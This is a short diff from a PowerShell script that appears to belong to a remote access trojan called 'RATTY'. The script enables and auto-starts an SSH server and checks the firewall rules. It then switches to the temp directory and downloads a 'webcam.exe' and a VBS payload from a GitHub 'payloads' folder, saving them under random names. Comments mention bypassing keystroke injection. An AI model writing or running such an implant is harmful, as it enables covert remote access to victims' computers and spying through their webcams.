@@ -96,6 +96,7 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh* 
 # install the webcam here and bypass the keystroke injection
+Set-Location $env:temp
 Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/webcam.exe" -OutFile "CBMfWVYiXZ.exe"
 # generateb random name for the vbs file
 Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/confirm-cam.vbs" -OutFile "ZLFfcquOxv.vbs"
